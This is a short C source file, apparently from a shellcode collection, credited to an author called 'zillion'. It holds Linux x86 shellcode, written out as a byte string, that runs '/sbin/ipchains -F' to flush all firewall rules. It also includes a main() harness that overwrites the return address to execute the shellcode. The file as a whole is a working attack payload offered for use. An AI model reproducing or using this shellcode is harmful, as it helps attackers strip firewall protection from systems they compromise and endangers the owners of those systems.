Author: zillion
Email: zillion@safemode.org
Homepage: http://www.safemode.org


Linux x86 shell code that does an execve of /sbin/ipchains -F


File name: flush-ipchains-shellcode.c


/*
 * This shellcode will do /sbin/ipchains -F
 * Written by zillion@safemode.org
 *
 */

char shellcode[]=
        "\xeb\x21\x5e\x31\xc0\x88\x46\x0e\x88\x46\x11\x89\x76\x12\x8d"
        "\x5e\x0f\x89\x5e\x16\x89\x46\x1a\xb0\x0b\x89\xf3\x8d\x4e\x12"
        "\x8d\x56\x1a\xcd\x80\xe8\xda\xff\xff\xff\x2f\x73\x62\x69\x6e"
        "\x2f\x69\x70\x63\x68\x61\x69\x6e\x73\x38\x2d\x46\x32\x33\x34"
        "\x35\x36\x37\x38\x39\x61\x62\x63\x64\x65";


int main()
{

  int *ret;
  ret = (int *)&ret + 2;
  (*ret) = (int)shellcode;
}